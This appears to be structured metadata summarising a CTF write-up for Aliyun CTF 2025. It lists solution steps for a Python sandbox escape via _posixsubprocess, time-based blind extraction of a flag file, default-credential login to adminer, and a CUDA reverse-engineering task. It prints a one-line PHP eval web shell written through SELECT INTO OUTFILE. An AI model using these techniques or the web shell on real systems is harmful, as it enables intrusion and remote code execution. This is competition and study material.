...
quality: high
full_path: 阿里云CTF2025_writeup_by_Min-Venom.full.md
meta_path: 阿里云CTF2025_writeup_by_Min-Venom.meta.md
images_removed: true
images_removed_count: 9
schema_version: v3.0.0-P0
summary: '阿里云 CTF 2025 WriteUp by Min-Venom。阿里云 2025：Python _posixsubprocess 沙箱逃逸 + 时间盲注 + adminer 数据库写马 + CUDA S-box + XTEA-like 加密。。关键路径：Web ezoj: _posixsubprocess.fork_exec 绕过 Python 沙箱执行 /bin/sh → 时间盲注: ...'
category: misc
...
contest_type: open
wp_url: https://www.ctfiot.com/229032.html
wp_author: Min-Venom
reasoning_chain:
- Web ezOJ sandbox → 触发点：exec 受限但 _posixsubprocess 可用
- 假设：_posixsubprocess.fork_exec 绕过 Python 沙箱 → 动作：import _posixsubprocess
- 观察：能执行 /bin/sh 但结果回不来 → 假设：盲注
- 动作：base64 编码 payload → echo 'poc2'|base64 -d > /tmp/1.py
- '假设：if os.popen(''cat /flag*'').read()[i-1]==''j'': time.sleep(2) → 动作：循环触发'
- 观察：响应时间 > 2s 即字符匹配 → flag = aliyunctf{bb050a11-…}
- 打卡 OK login.php~ 源码 → 触发点：adminer_481.php 数据库直连
- 假设：MySQL root:root 默认密码 → 动作：adminer 登入
- 动作：SELECT '<?php eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'
- RE easy-cuda-rev → 假设：dump PTX 提 S-box → 动作：nibble_swap(rs17<<4|rs17>>4)+S-box+XOR i
- 动作：逆 XTEA-like 8 轮 4 delta → 观察：还原 flag
failed_attempts:
- 试图用 exec/eval/subprocess 绕沙箱 → 失败：被拦
- 试图 root:root 默认登入 adminer → 成功（默认密码漏）
key_observations:
- _posixsubprocess.fork_exec 是 Python 沙箱逃逸隐藏口子
- 时间盲注 if ... sleep(2) 是无回显场景通用手法
- MySQL root:root 默认密码是 adminer 直连经典踩点
- CUDA PTX 逆向核心是提取常量 S-box + 逆循环算法
prerequisites:
- Python 沙箱逃逸（_posixsubprocess 隐藏口子）
- 时间盲注（sleep 副作用）
- adminer 数据库管理工具使用
- CUDA PTX + AES S-box 还原
---
